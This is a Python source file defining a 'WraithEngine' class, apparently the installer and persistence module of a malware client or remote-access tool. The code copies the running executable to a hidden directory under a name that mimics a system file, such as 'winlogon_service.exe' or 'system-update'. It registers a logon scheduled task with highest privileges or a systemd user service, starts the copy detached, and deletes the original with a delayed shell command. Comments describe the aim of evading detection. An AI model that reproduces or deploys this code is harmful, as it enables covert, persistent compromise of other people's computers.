import os
import sys
import shutil
import subprocess
import time
from src.client.core.platform import Platform
from src.client.core.config import Config

class WraithEngine:
    def __init__(self):
        self.appdata = Platform.get_appdata_path()
        # Legitimate looking hidden path
        if Platform.is_windows():
            self.install_dir = os.path.join(self.appdata, "Microsoft", "Windows", "SystemData")
            self.install_name = "winlogon_service.exe"
        else:
            self.install_dir = os.path.join(self.appdata, "systemd", "user")
            self.install_name = "system-update"
            
        self.install_path = os.path.join(self.install_dir, self.install_name)

    def melt(self):
        """Migrate to hidden path and delete the original stager."""
        current_exe = sys.executable
        
        # 1. Don't melt if we're already running from the install path
        if os.path.abspath(current_exe).lower() == os.path.abspath(self.install_path).lower():
            return False

        try:
            # 2. Create hidden directory
            if not os.path.exists(self.install_dir):
                os.makedirs(self.install_dir)
                if Platform.is_windows():
                    import ctypes
                    ctypes.windll.kernel32.SetFileAttributesW(self.install_dir, 0x02 | 0x04) # Hidden + System

            # 3. Copy to hidden path
            shutil.copy2(current_exe, self.install_path)
            
            # 4. Install Persistence for the NEW path
            self.install_advanced_persistence()

            # 5. Start the new process
            if Platform.is_windows():
                subprocess.Popen([self.install_path], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
            else:
                subprocess.Popen([self.install_path], start_new_session=True)

            # 6. Self-Delete the original
            self.self_delete(current_exe)
            sys.exit(0)
        except Exception as e:
            print(f"Melt Error: {e}")
            return False

    def self_delete(self, path):
        """Triggers self-deletion of the original file."""
        if Platform.is_windows():
            # Classic cmd self-delete trick
            cmd = f'choice /C Y /N /D Y /T 3 & Del "{path}"'
            subprocess.Popen(cmd, shell=True, creationflags=subprocess.DETACHED_PROCESS)
        else:
            # Linux self-delete is easier
            subprocess.Popen(f'sleep 3 && rm "{path}"', shell=True)

    def install_advanced_persistence(self):
        """Multi-layered persistence (Task Scheduler / Systemd)."""
        if Platform.is_windows():
            try:
                # Use Task Scheduler (harder to find than Registry)
                # Task runs every time any user logs on, and every 1 hour
                cmd = f'schtasks /create /f /sc onlogon /tn "WindowsSystemUpdate" /tr "{self.install_path}" /rl highest'
                subprocess.run(cmd, shell=True, capture_output=True)
            except:
                pass
        elif Platform.is_linux():
            try:
                # Create a systemd user service
                service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart={self.install_path}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"""
                service_path = os.path.expanduser("~/.config/systemd/user/system-update.service")
                os.makedirs(os.path.dirname(service_path), exist_ok=True)
                with open(service_path, "w") as f:
                    f.write(service_content)
                
                subprocess.run("systemctl --user daemon-reload", shell=True)
                subprocess.run("systemctl --user enable system-update.service", shell=True)
            except:
                pass

    def start_watchdog(self):
        """Spawns a secondary process to monitor this one (Soon)."""
        # Logic for the 'Twin-Soul' Watchdog goes here
        pass
